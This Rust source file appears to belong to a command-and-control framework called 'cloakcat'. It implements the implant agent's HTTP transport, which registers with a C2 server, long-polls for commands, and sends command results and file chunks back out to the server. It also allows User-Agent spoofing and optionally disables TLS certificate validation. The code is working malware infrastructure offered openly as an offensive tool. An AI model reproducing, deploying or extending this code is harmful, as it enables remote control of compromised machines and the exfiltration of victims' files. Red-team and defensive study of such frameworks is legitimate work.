//! Transport abstraction for C2 communication.

use std::env;

use anyhow::Result;
use cloakcat_protocol::{FileChunk, ListenerProfile, RegisterReq, RegisterResp, ResultReq};
use reqwest::Client;

/// Defines how the agent communicates with the C2 server.
/// Concrete implementations can swap HTTP for DNS, SMB, etc.
#[allow(async_fn_in_trait)]
pub trait Transport {
    /// Register this agent with the server.
    async fn register(&self, url: &str, token: &str, req: &RegisterReq) -> Result<RegisterResp>;

    /// Long-poll for a command. Returns (status_code, body_text).
    async fn poll(&self, url: &str, token: &str) -> Result<(u16, String)>;

    /// Upload a command result.
    async fn send_result(&self, url: &str, token: &str, req: &ResultReq) -> Result<()>;

    /// Fetch assembled file bytes for an upload task.
    async fn fetch_upload_file(&self, url: &str, token: &str) -> Result<Vec<u8>>;

    /// Send a single download chunk to the server.
    async fn send_download_chunk(&self, url: &str, token: &str, chunk: &FileChunk) -> Result<()>;
}

/// HTTP transport backed by reqwest.
pub struct HttpTransport {
    client: Client,
}

impl HttpTransport {
    pub fn new(profile: &dyn ListenerProfile, c2_url: &str) -> Result<Self> {
        let mut builder = Client::builder();
        if let Some(ua) = profile.user_agent() {
            let mut headers = reqwest::header::HeaderMap::new();
            headers.insert(
                reqwest::header::USER_AGENT,
                reqwest::header::HeaderValue::from_str(ua)
                    .expect("profile user_agent must be valid header value"),
            );
            builder = builder.default_headers(headers);
        }
        if c2_url.starts_with("https://") {
            let accept_invalid = env::var("AGENT_ACCEPT_INVALID_CERTS").as_deref() == Ok("1");
            builder = builder.danger_accept_invalid_certs(accept_invalid);
        }
        Ok(Self {
            client: builder.build()?,
        })
    }
}

impl Transport for HttpTransport {
    async fn register(&self, url: &str, token: &str, req: &RegisterReq) -> Result<RegisterResp> {
        let resp = self
            .client
            .post(url)
            .header("X-Agent-Token", token)
            .json(req)
            .send()
            .await?;
        let reg: RegisterResp = resp.json().await?;
        Ok(reg)
    }

    async fn poll(&self, url: &str, token: &str) -> Result<(u16, String)> {
        let resp = self
            .client
            .get(url)
            .header("X-Agent-Token", token)
            .send()
            .await?;
        let status = resp.status().as_u16();
        let text = resp.text().await?;
        Ok((status, text))
    }

    async fn send_result(&self, url: &str, token: &str, req: &ResultReq) -> Result<()> {
        let resp = self
            .client
            .post(url)
            .header("X-Agent-Token", token)
            .json(req)
            .send()
            .await?;
        if !resp.status().is_success() {
            let status = resp.status();
            let text = resp.text().await.unwrap_or_default();
            anyhow::bail!("status={} body={}", status, text);
        }
        Ok(())
    }

    async fn fetch_upload_file(&self, url: &str, token: &str) -> Result<Vec<u8>> {
        let resp = self
            .client
            .get(url)
            .header("X-Agent-Token", token)
            .send()
            .await?;
        if !resp.status().is_success() {
            let status = resp.status();
            let text = resp.text().await.unwrap_or_default();
            anyhow::bail!("fetch_upload_file: status={} body={}", status, text);
        }
        Ok(resp.bytes().await?.to_vec())
    }

    async fn send_download_chunk(&self, url: &str, token: &str, chunk: &FileChunk) -> Result<()> {
        let resp = self
            .client
            .post(url)
            .header("X-Agent-Token", token)
            .json(chunk)
            .send()
            .await?;
        if !resp.status().is_success() {
            let status = resp.status();
            let text = resp.text().await.unwrap_or_default();
            anyhow::bail!("send_download_chunk: status={} body={}", status, text);
        }
        Ok(())
    }
}
